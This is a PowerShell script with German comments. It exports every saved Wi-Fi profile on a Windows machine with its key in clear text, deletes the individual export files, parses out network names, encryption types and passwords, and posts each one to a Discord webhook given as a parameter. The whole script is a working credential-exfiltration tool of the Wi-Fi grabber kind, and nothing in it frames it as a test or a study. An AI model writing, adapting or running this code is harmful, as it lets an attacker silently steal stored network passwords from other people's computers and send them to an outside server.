# -----------------------------------------------------------------------------
# 1. PARAMETER DEFINITION
# -----------------------------------------------------------------------------
param(
    [Parameter(Mandatory=$true)]
    [string]$WebhookUri,

    [string]$ExportFolder = "C:\WLAN_Backup",
    [string]$OutputFileName = "WLAN-Profile_Gesamt.xml",
    
    [string]$username = "WLAN-Profil-Reporter"
)

# Interne Konfiguration
$OutputFile = Join-Path $ExportFolder $OutputFileName
$color = 3066993 # Discord Embed Farbe (Helles Blau)
$namespaceUri = "http://www.microsoft.com/networking/WLAN/profile/v1"

# -----------------------------------------------------------------------------
# 2. EXPORT UND KONSOLIDIERUNG DER XML-DATEIEN
# -----------------------------------------------------------------------------
Write-Host "--- Start der Konsolidierung ---"

# Sicherstellen, dass der Export-Ordner existiert
Write-Host "Erstelle oder überprüfe den Export-Ordner: $ExportFolder"
if (-not (Test-Path $ExportFolder)) {
    New-Item -Path $ExportFolder -ItemType Directory | Out-Null
}

# Export der Profile (erzeugt Einzeldateien)
Write-Host "Exportiere alle WLAN-Profile mit unverschlüsseltem Schlüssel..."
netsh wlan export profile key=clear folder="$ExportFolder"

# Start des neuen Stammelements (für die konsolidierte Datei)
[string]$CombinedXML = '<?xml version="1.0" encoding="UTF-8"?>' + "`n"
$CombinedXML += '<WLANProfiles xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">' + "`n"

# Alle exportierten XML-Dateien durchgehen und zusammenführen
$ExportedFiles = Get-ChildItem -Path $ExportFolder -Filter "WLAN-*.xml" 
Write-Host "Verarbeite $($ExportedFiles.Count) exportierte Einzeldateien..."

foreach ($File in $ExportedFiles) {
    $ProfileContent = Get-Content $File.FullName -Raw
    
    # Regulärer Ausdruck, um den gesamten <WLANProfile>...</WLANProfile> Block zu extrahieren.
    if ($ProfileContent -match '(<WLANProfile[\s\S]*</WLANProfile>)') {
        $WlanProfileBlock = $Matches[1]
        
        # Entferne die umhüllenden Tags und den Namespace, da sie im Stammelement bereits vorhanden sind.
        $WlanProfileContent = $WlanProfileBlock -replace '<WLANProfile.*?>\s*', '' -replace '</WLANProfile>\s*', ''

        $CombinedXML += "`n"
        $CombinedXML += ""
        $CombinedXML += $WlanProfileContent
        $CombinedXML += "`n"

        # Bereinigung: Löschen der einzelnen Exportdatei
        Remove-Item $File.FullName
    }
}

# Ende des neuen Stammelements schreiben
$CombinedXML += '</WLANProfiles>' + "`n"

# Gesamt-XML-Datei speichern
$CombinedXML | Set-Content $OutputFile -Encoding UTF8

Write-Host "✅ Konsolidierung abgeschlossen. Datei: $OutputFile"
Write-Host "---------------------------------------------------------------------"


# -----------------------------------------------------------------------------
# 3. PARSEN UND SENDEN AN DISCORD
# -----------------------------------------------------------------------------
Write-Host "--- Start der Datenextraktion und des Sendens ---"

## 3.1. Konsolidierte XML-Datei einlesen
try {
    $xmlString = Get-Content -Path $OutputFile -Raw -ErrorAction Stop
    [xml]$xmlContent = $xmlString
}
catch {
    Write-Error "FEHLER: Konnte die konsolidierte XML-Datei '$OutputFile' nicht laden. $($_.Exception.Message)"
    exit 1
}

## 3.2. Namespace Manager initialisieren (für XPath)
$namespaceManager = New-Object System.Xml.XmlNamespaceManager $xmlContent.NameTable
$namespaceManager.AddNamespace("wlan", $namespaceUri)

## 3.3. Profile extrahieren (Workaround für die fehlerhafte Binnenstruktur)
$profilesList = @()
$rootNode = $xmlContent.SelectSingleNode("//wlan:WLANProfiles", $namespaceManager)

if ($rootNode -eq $null) {
    Write-Error "FEHLER: Das Stammelement <WLANProfiles> konnte nicht gefunden werden (Unbekanntes XML-Format)."
    exit 1
}

# Finde alle <name>-Tags als Startpunkt für die Profile
$nameNodes = $rootNode.SelectNodes("wlan:name", $namespaceManager)
Write-Host "Starte Verarbeitung von $($nameNodes.Count) erkannten Profilen..."

foreach ($nameNode in $nameNodes) {
    # Name extrahieren (berücksichtigt CDATA)
    $profileName = $nameNode.'#text'
    if ($profileName -eq $null) { $profileName = $nameNode.InnerText }
    
    $encryption = "N/A (Nicht gefunden)"
    $keyMaterial = "N/A (Nicht gefunden)"
    
    # Suche nachfolgende Elemente (Geschwisterknoten/Siblings) für Verschlüsselung/Schlüssel
    $currentNode = $nameNode.NextSibling
    
    while ($currentNode -ne $null -and $currentNode.LocalName -ne 'name') {
        if ($currentNode -is [System.Xml.XmlElement] -and $currentNode.LocalName -eq 'MSM') {
            
            # Suche Verschlüsselung
            $authNode = $currentNode.SelectSingleNode("wlan:security/wlan:authEncryption/wlan:authentication", $namespaceManager)
            if ($authNode -ne $null) {
                $encryption = $authNode.'#text'
            }
            
            # Suche Schlüsselmaterial
            $keyNode = $currentNode.SelectSingleNode("wlan:security/wlan:sharedKey/wlan:keyMaterial", $namespaceManager)
            if ($keyNode -ne $null) {
                $keyMaterial = $keyNode.'#text'
            }
        }
        $currentNode = $currentNode.NextSibling
    }
    
    # Ergebnis speichern
    $profilesList += [PSCustomObject]@{ 
        Name = $profileName.Trim(); 
        Encryption = $encryption; 
        KeyMaterial = $keyMaterial 
    }
}


## 3.4. Über alle Profile iterieren und senden
$profileCounter = 1
foreach ($profile in $profilesList) {
    $profileName = $profile.Name
    $encryption = $profile.Encryption
    $keyMaterial = $profile.KeyMaterial

    # Kosmetik: Wenn Verschlüsselung 'open' ist und kein Schlüssel gefunden wurde, anpassen
    if ($encryption -ceq 'open' -and $keyMaterial -like 'N/A*') {
        $keyMaterial = "None (Offenes Netzwerk)"
    }
    
    # Discord Payload erstellen
    $embed = [PSCustomObject]@{
        title = "WLAN-Profil-Daten ($profileName) - ($profileCounter/$($profilesList.Count))"
        color = $color
        fields = @(
            @{ name = "Profil-Name"; value = $profileName; inline = $true },
            @{ name = "Verschlüsselung"; value = $encryption; inline = $true },
            @{ name = "Schlüsselmaterial (Passwort)"; value = $keyMaterial; inline = $false }
        )
        footer = @{
            text = "Gesendet von PowerShell um $(Get-Date -Format 'HH:mm:ss')"
        }
    }

    $payload = [PSCustomObject]@{
        username = $username
        embeds   = @($embed)
    }

    # JSON-Payload senden
    try {
        $jsonPayload = $payload | ConvertTo-Json -Depth 5
        
        Invoke-RestMethod -Uri $WebhookUri `
            -Method Post `
            -ContentType 'application/json' `
            -Body $jsonPayload `
            -ErrorAction Stop

        Write-Host "--- Nachricht für Profil '$profileName' erfolgreich gesendet."
    }
    catch {
        Write-Error "!!! FEHLER beim Senden des Webhooks für Profil '$profileName': $($_.Exception.Message)"
    }
    
    $profileCounter++
    Start-Sleep -Seconds 1 # Wartezeit, um Discord Rate Limits zu vermeiden
}

Write-Host "--- Alle Profile wurden verarbeitet und gesendet. ---"